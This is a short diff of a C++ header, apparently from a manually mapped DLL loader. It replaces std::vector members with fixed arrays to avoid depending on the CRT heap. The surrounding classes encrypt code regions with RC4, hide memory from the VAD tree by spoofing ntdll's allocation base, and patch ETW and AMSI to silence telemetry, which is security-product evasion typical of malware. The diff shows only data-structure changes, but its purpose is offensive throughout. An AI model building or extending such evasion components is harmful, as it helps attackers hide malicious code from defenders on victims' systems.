@@ -74,7 +74,10 @@ private:
         bool     isCode;     // true: 代码段 (需要刷新 I-Cache)
     };
 
-    std::vector<ProtectedRegion> m_regions;
+    // ★ v3.125: 固定数组替代 std::vector — 避免手动映射 DLL 上下文中 CRT 堆未初始化
+    static constexpr size_t MAX_REGIONS = 64;
+    ProtectedRegion m_regions[MAX_REGIONS];
+    int m_regionCount = 0;
     BYTE m_masterKey[16] = {}; // RC4 主密钥
     bool m_initialized = false;
 };
@@ -179,7 +182,10 @@ private:
         SIZE_T  size;
     };
 
-    static std::vector<VADHiddenRegion> s_vadHiddenRegions;
+    // ★ v3.125: 固定数组替代 std::vector — 避免 CRT 堆依赖
+    static constexpr size_t MAX_VAD_REGIONS = 64;
+    static VADHiddenRegion s_vadHiddenRegions[MAX_VAD_REGIONS];
+    static int s_vadRegionCount;
 
     // ★ Fix B2: 获取合法模块基址用于 AllocationBase 伪装
     // 优先使用 ntdll.dll, 因为它是所有进程的默认加载模块
@@ -236,9 +242,11 @@ private:
     TelemetrySilencer() = default;
 
     struct PatchRecord {
-        void*    addr;
-        SIZE_T   size;
-        std::vector<BYTE> originalBytes;
+        void*    addr = nullptr;
+        SIZE_T   size = 0;
+        // ★ v3.125: 固定数组替代 std::vector — 避免 CRT 堆依赖
+        BYTE     originalBytes[16] = {};  // 最大 16 字节 (ETW 3 + AMSI 6)
+        SIZE_T   originalSize = 0;
     };
 
     static PatchRecord s_etwPatch;
